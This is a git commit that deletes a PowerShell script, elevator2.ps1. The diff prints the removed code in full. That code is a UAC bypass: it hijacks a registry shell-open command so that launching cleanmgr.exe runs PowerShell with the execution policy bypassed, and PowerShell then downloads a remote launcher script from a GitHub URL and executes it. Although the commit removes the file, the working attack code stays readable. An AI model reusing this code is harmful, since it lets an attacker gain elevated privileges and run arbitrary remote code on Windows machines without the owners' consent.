f5fc26ed716069e7a8e8570110d413c094e87da2
serpiajonna-bit <serpiajonna@gmail.com>
2025-11-24 15:18:04 -0500

    Delete elevator2.ps1

--- elevator2.ps1
+++
@@ -1,5 +0,0 @@
-# This script uses the diskcleanup.exe UAC bypass.
-$RegKey = "HKCU\Software\Classes\shell\open\command"
-Set-ItemProperty -Path $RegKey -Name "(Default)" -Value "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/launcher.ps1')\""
-Set-ItemProperty -Path $RegKey -Name "DelegateExecute" -Value ""
-Start-Process "C:\Windows\System32\cleanmgr.exe" -ArgumentList "/autoclean"
